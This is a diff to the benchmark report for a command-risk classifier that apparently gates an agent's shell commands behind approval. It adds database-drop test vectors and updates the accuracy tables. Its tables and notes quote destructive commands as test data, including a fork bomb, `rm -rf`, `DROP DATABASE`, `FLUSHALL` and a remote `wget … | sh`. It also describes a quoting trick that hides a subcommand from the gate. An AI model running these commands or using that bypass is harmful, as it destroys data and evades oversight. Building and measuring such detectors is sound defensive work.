@@ -46,7 +46,7 @@ from `apps/sidecar/src/normalize.ts` — with no mocks.
   the strict leak gate over the rest of the tree stays hole-free.
 
 Corpus size: **38 redaction positives** across **29 kind families**, **28 hard negatives**, and
-**82 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
+**89 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
 Git shell-alias, dynamic-executable, redirect-placement adversarial forms, and one shape from each
 classifier audit round since the sixth — remote-runner substitution, heredoc bodies, compound
 statements, quoted assignments, ANSI-C and `$$` quoting, unterminated heredocs, command-word
@@ -159,13 +159,13 @@ the tool input (not from the command string alone) and are **out of scope** for 
 | recursive-rm      | 25      | 100.0%    | 100.0%     |
 | disk-destroy      | 4       | 80.0%     | 100.0%     |
 | history-rewrite   | 8       | 100.0%    | 100.0%     |
-| db-drop           | 4       | 66.7%     | 100.0%     |
+| db-drop           | 9       | 75.0%     | 100.0%     |
 | fork-bomb         | 1       | 100.0%    | 100.0%     |
 | perm-change       | 5       | 100.0%    | 100.0%     |
 | inline-code       | 13      | 100.0%    | 100.0%     |
 | migrate-prod      | 2       | 50.0%     | 100.0%     |
 | high-risk-other   | 1       | 11.1%     | 100.0%     |
-| **micro-average** | 63      | **82.9%** | **100.0%** |
+| **micro-average** | 68      | **82.9%** | **100.0%** |
 
 **Recall is 100% on every category** — nothing dangerous in the corpus slips past the classifier.
 Read that as a statement about _this corpus_, not a general guarantee: the corpus is only as good as
@@ -195,10 +195,10 @@ than over-gating (an extra approval prompt)**, so ambiguous cases fail toward "g
 
 | Policy                              | Precision | Recall | TP / FP / FN / TN |
 | ----------------------------------- | --------- | ------ | ----------------- |
-| default-gated (out-of-box)          | 94.2%     | 100.0% | 49 / 3 / 0 / 30   |
-| strict-all (every category enabled) | 91.8%     | 100.0% | 56 / 5 / 0 / 21   |
+| default-gated (out-of-box)          | 93.1%     | 100.0% | 54 / 4 / 0 / 31   |
+| strict-all (every category enabled) | 91.0%     | 100.0% | 61 / 6 / 0 / 22   |
 
-- Risk-level exact-match accuracy: **91.5%**.
+- Risk-level exact-match accuracy: **91.0%**.
 - Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **100.0%**.
   (Before 2026-08-28 this was 98.2%: `DROP DATABASE` was the one dangerous vector the risk verdict
   rated `low`; it is now `high`, see the calibration notes.)
@@ -210,10 +210,10 @@ their noisier keyword matches therefore do not affect default-gated precision.
 
 ### Divergences from human labels (findings / calibration notes)
 
-The harness prints every divergence: thirteen **category** divergences, listed in full in this table,
-and seven **risk-level** divergences, listed in full under "Risk-level calibration notes" below (an
+The harness prints every divergence: fourteen **category** divergences, listed in full in this table,
+and eight **risk-level** divergences, listed in full under "Risk-level calibration notes" below (an
 earlier revision listed four category rows of ten and claimed the table was complete; it was not).
-All category false positives are **safe-direction over-gates**. Five come from whole-command keyword
+All category false positives are **safe-direction over-gates**. Six come from whole-command keyword
 literals; eight are the `high-risk-other` marker — the classifier's "this segment could not be
 analysed" floor — riding alongside a named category that _is_ correct, which is why that category's
 precision (11.1%) is the lowest in the table above. No category divergence loses a label. Two of
@@ -229,6 +229,7 @@ rated `high` (see the calibration notes).
 | `echo 'see the production runbook'`                | predicted `migrate-prod`                                       | `production` keyword in prose. Off by default.                                                                                                                                                     |
 | `cat docs/migrate-guide.md`                        | predicted `migrate-prod`                                       | `migrate` keyword in a filename. Off by default.                                                                                                                                                   |
 | `man dropdb`                                       | predicted `db-drop`                                            | The bare-token `dropdb` literal fires on a manual-page lookup. Keyword match, not intent — the measured cost of the literal added with task 01a03b76 (safe-direction; on by default).              |
+| `grep -rn flushall src/`                           | predicted `db-drop`                                            | The bare-token `flushall` literal fires on a source search. Same keyword class as `man dropdb` — the measured cost of the redis literal added with task 01a0440b (safe-direction; on by default).  |
 | `:(){ :\|:& };:`                                   | extra `high-risk-other` (label: `fork-bomb`)                   | The function-definition syntax splits into segments (`:(){ :`, `}`) that have no readable program name; each draws the unanalyzable-segment marker. `fork-bomb` is still detected.                 |
 | `cp report.txt >$(find /var/tmp -delete)`          | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | The executable redirect target is carried into classification as its own segment whose only token is the raw `$(…)`; that segment draws the marker while its body yields the correct categories.   |
 | `cp report.txt >"$(find /var/tmp -delete)"`        | extra `high-risk-other` (same labels)                          | Same mechanism, quoted target.                                                                                                                                                                     |
@@ -238,7 +239,7 @@ rated `high` (see the calibration notes).
 | `cat <<EOF` … `don't $(rm -rf /srv) isn't` … `EOF` | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An unquoted heredoc body expands `$(…)`; the expanded substitution is surfaced as its own segment whose only token is the raw substitution, and that segment draws the marker (audit R10 H2).      |
 | empty backtick substitution before `rm -rf /srv`   | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An empty substitution in the command-word position cannot name a program statically; the flattened form supplies `recursive-rm`, the unanalyzable word supplies the marker (audit R11 SEC-CQ11-1). |
 
-Risk-level calibration notes — all seven risk-level divergences. The count and the presence of
+Risk-level calibration notes — all eight risk-level divergences. The count and the presence of
 every command below are pinned by `inv-safety-bench-published.test.ts` against the live bench, so
 this list can no longer fall behind the harness (an earlier revision listed three of the then
 seven while calling itself complete):
@@ -257,18 +258,38 @@ seven while calling itself complete):
   `high` / `db-drop` in both modes. The corpus carries `man dropdb` as a benign carrier so this
   class is measured (it is the `db-drop` precision drop and the extra gate false positive in the
   tables above), not assumed. Safe-direction over-gate; no gate is weakened.
+- **Closed (2026-08-28, task 01a0440b):** the `db-drop` literal list was PostgreSQL-centric. The
+  MySQL CLI `mysqladmin … drop`, the Mongo shell `db.dropDatabase()` from the command line,
+  `DROP SCHEMA`, `DROP OWNED BY`, and redis `FLUSHALL` / `FLUSHDB` all rated `low` with no
+  category — no card in either mode. They are now `high` / `db-drop` literals (add-only), pinned by
+  `INV-DB-DROP-RISK-VERDICT` at the classifier and at the bridge; the snake_case `drop_database(`
+  of pymongo / sqlalchemy-utils joins the same literal for symmetry (its usual `python -c` carrier
+  was already `medium` / `inline-code`, so that form was carded before — it now also names the
+  category). The corpus carries one vector per form plus two negatives: `mysqladmin status` (a true
+  negative — the rule needs a `drop` word within 512 characters with no `|` `;` `&` or newline
+  between; that boundary is quote-unaware, so `-p'a;b'` or a backslash line continuation hides the
+  subcommand, tracked for v0.9; the longest gap this corpus exercises is 20 characters, so the 512
+  bound itself is pinned by unit tests — a 319-character-gap real invocation and the 512/513 boundary —
+  rather than by these numbers) and `grep -rn flushall src/` (a benign carrier of the bare-token
+  redis literal, the same keyword false-positive class as `man dropdb`, measured on purpose). The
+  bare-token reach is wider than that search example: `node -e "cache.flushAll()"` (the
+  node-cache method name), a path such as `/var/lib/flushall`, or piping logs through
+  `grep flushdb` all rate `high` / `db-drop` now. Not covered on purpose: Mongo's
+  `db.collection.drop()` — a `.drop(` literal collides with pandas and friends — and MySQL's
+  `DROP DATABASE`, which the existing SQL literal already catches.
 - `find /var/tmp -type f -exec rm {} ;` classifies as `medium` rather than `high`; it is still
   gated (`recursive-rm`).
 - `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
   human label says `high`: the quoted script is classified as inner code and gates because that
   inner code pipes a download into `sh`, but the classifier does not escalate a remote pipe-to-shell
   above the inline-code floor. It is carded in both modes; the divergence is the severity word.
-- Five vectors rate `high` where the human label says `low`: `grep -rn 'DROP TABLE' migrations/`,
+- Six vectors rate `high` where the human label says `low`: `grep -rn 'DROP TABLE' migrations/`,
   `echo 'see the production runbook'`, `cat docs/migrate-guide.md`,
-  `dd if=backup.iso of=restore.iso bs=4M`, and `man dropdb`. Each is the risk-level face of a
-  category false positive already listed in the table above (a keyword literal firing on a search
-  argument, prose, a filename, a file-to-file copy, or a manual-page lookup), and each draws an
-  approval card under ordinary approval — a safe-direction over-gate, not a miss.
+  `dd if=backup.iso of=restore.iso bs=4M`, `man dropdb`, and `grep -rn flushall src/`. Each is the
+  risk-level face of a category false positive already listed in the table above (a keyword literal
+  firing on a search argument, prose, a filename, a file-to-file copy, a manual-page lookup, or a
+  source search), and each draws an approval card under ordinary approval — a safe-direction
+  over-gate, not a miss.
 
 ## External corpus cross-evaluation (gitleaks)
 
